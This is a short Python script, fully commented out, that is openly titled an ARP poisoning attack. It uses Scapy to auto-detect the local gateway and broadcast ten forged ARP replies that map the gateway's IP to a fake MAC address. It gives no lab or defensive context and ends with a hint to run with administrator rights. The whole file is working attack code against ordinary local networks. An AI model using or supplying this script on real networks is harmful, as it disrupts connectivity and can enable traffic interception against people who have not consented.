# import sys
# import os
# import time
# import socket
# from scapy.all import ARP, Ether, sendp, conf

# print("--- ☠️ ROBUST ARP POISONING ATTACK ---")

# def get_gateway_ip():
#     """Auto-detect user's gateway."""
#     try:
#         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
#             s.connect(("8.8.8.8", 80))
#             return s.getsockname()[0].rsplit('.', 1)[0] + '.1'
#     except:
#         return "192.168.1.1"

# TARGET_IP = get_gateway_ip()
# FAKE_MAC = "aa:bb:cc:dd:ee:ff"

# print(f"[*] Auto-Detected Gateway: {TARGET_IP}")
# print(f"[*] Spoofing as: {FAKE_MAC}")

# # Construct packet
# arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=TARGET_IP, hwsrc=FAKE_MAC, pdst="255.255.255.255")

# # Detect Interface for sending
# try:
#     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#     s.connect(("8.8.8.8", 80))
#     local_ip = s.getsockname()[0]
#     s.close()
#     print(f"[*] Sending via adapter with IP: {local_ip}")
# except:
#     pass

# print("[!] Sending 10 Poisoned Packets...")

# try:
#     for i in range(10):
#         # Allow Scapy to route automatically based on destination
#         sendp(arp_packet, verbose=False)
#         print(f"[>] Packet {i+1} Sent")
#         time.sleep(1)
# except Exception as e:
#     print(f"[❌] Error sending: {e}")
#     print("TRY RUNNING TERMINAL AS ADMINISTRATOR.")

# print("[✔] Attack Complete.")